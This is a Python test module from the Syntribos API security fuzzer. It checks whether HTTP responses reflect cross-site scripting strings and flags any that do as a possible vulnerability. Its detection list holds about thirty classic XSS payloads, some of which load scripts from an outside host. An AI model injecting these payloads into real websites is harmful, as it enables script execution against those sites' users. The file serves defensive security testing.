# Copyright 2015 Rackspace
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
from syntribos.issue import Issue
from syntribos.tests.fuzz import base_fuzz


class XSSBody(base_fuzz.BaseFuzzTestCase):
    test_name = "XSS_BODY"
    test_type = "data"
    data_key = "xss.txt"
    failure_keys = [
        """<SCRIPT>alert('XSS');</SCRIPT>""",
        """<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>""",
        """<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>""",
        """<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>""",
        """<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>""",
        """<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>""",
        """<IMG SRC="javascript:alert('XSS');">""",
        """<IMG SRC=javascript:alert('XSS')>""",
        """<IMG SRC=JaVaScRiPt:alert('XSS')>""",
        """<IMG SRC=javascript:alert(&quot;XSS&quot;)>""",
        """<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>""",
        """<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>""",
        """<IMG DYNSRC="javascript:alert('XSS')">""",
        """<IMG LOWSRC="javascript:alert('XSS')">""",
        """<DIV STYLE="background-image: url(javascript:alert('XSS'))">""",
        """<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">""",
        """<DIV STYLE="width: expression(alert('XSS'));">""",
        """<META HTTP-EQUIV="refresh"
        CONTENT="0;url=javascript:alert('XSS');">""",
        """<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,
        PHNjcmlwdD5hbGVydCgnWFNJyk8L3NjcmlwdD4K">""",
        """<META HTTP-EQUIV="Link" Content="<javascript:alert('XSS')>;
        REL=stylesheet">""",
        """<META HTTP-EQUIV="refresh" CONTENT="0;
        URL=http://;URL=javascript:alert('XSS');">""",
        """<STYLE TYPE="text/javascript">alert('XSS');</STYLE>""",
        """<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE>
        <A CLASS=XSS></A>""",
        """<STYLE type="text/css">
        BODY{background:url("javascript:alert('XSS')")}</STYLE>""",
        """<BASE HREF="javascript:alert('XSS');//">""",
        """<OBJECT TYPE="text/x-scriptlet"
        DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>""",
        """<OBJECT classid=clsid:ae24fdae-03c6-8b6-80c44f3>
        <param name=url value=javascript:alert('XSS')></OBJECT>""",
        """<XML SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML>"""]

    def test_case(self):
        self.test_default_issues()
        failed_strings = self.data_driven_failure_cases()
        if failed_strings and 'html' in self.resp.headers:
            self.register_issue(
                Issue(test="xss_strings",
                      severity="Medium",
                      confidence="Low",
                      text=("The string(s): \'{0}\', known to be commonly "
                            "returned after a successful XSS "
                            "attack, have been found in the response. This "
                            "could indicate a vulnerability to XSS "
                            "attacks.").format(failed_strings)
                      )
            )
